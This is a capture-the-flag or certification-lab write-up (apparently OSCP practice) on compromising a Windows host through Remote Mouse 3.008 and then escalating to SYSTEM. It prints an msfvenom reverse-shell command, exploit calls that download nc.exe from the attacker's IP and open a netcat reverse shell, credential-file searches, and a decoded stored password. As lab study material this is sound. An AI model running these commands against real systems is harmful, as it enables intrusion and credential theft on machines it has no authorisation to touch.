# Service Discovery

`scan --autorecon $IP`

![[Pasted image 20260721002531.png]]

## Open Ports & Priority

Notice uncommon ports 1978, 1979

# Service Enumeration

![[Pasted image 20260721002959.png]]

Googled, found https://www.exploit-db.com/exploits/46697 

Didn't have much success and would require more modification to get it working.

Downloaded https://github.com/p0dalirius/RemoteMouse-3.008-Exploit/blob/master/RemoteMouse-3.008-Exploit.py instead, which was easier to use without modification.

Generate a reverse shell payload to serve:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.176 LPORT=445 -f exe -o reverse.exe`

Start reverse shell listener:

`penelope -p 443 -O`

Struggled a bit, but had success using PowerShell like so with port 443:

```
./RemoteMouse-3.008-Exploit.py --target-ip 192.168.221.199 --cmd 'powershell -c "curl http://192.168.45.176/nc.exe -o C:\Windows\Temp\nc.exe"'

./RemoteMouse-3.008-Exploit.py --target-ip 192.168.221.199 --cmd 'powershell -c "C:\Windows\Temp\nc.exe 192.168.45.176 443 -e cmd.exe"'
```



# Privilege Escalation

`whoami /priv` shows that we have `SeShutdownPrivilege`, which can be used in certain PE vectors such as service or DLL hijacking.

Run
`Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe,*.zip -Recurse -ErrorAction SilentlyContinue`, find `C:\Users\divine\Downloads\FileZilla_3.56.2_win64-setup.exe`.

Google version, find https://nvd.nist.gov/vuln/detail/CVE-2023-53959, a DLL hijacking vulnerability. This version is missing TextShaping.dll in the application directory; if we replace with a malicious DLL, and run the client, we should be able to elevated to SYSTEM.

Unfortunately, we don't have write access to this location:

![[Pasted image 20260720231618.png]]

`findstr /SIM /C:"pass" *.txt,*.ini,*.cfg,*.xml` finds:

```
AppData\Roaming\FileZilla\filezilla.xml
AppData\Roaming\FileZilla\recentservers.xml
```

![[Pasted image 20260720232214.png]]


On Kali:
`echo 'Q29udHJvbEZyZWFrMTE=' | base64 -d` 

ControlFreak11

Check credential reuse: not valid for Administrator.

We can RDP in using this password, as divine is in Remote Desktop Users group.

Unquoted service paths? Yes, but nothing we can write to for exploitation.

`wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """`

![[Pasted image 20260721000807.png]]

Eventually find a LPE CVE for this version of Remote Mouse: https://www.exploit-db.com/exploits/50047

Follow instructions to get a shell as SYSTEM.
![[Pasted image 20260721001431.png]]


# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260720222554.png]]


![[Pasted image 20260721002001.png]]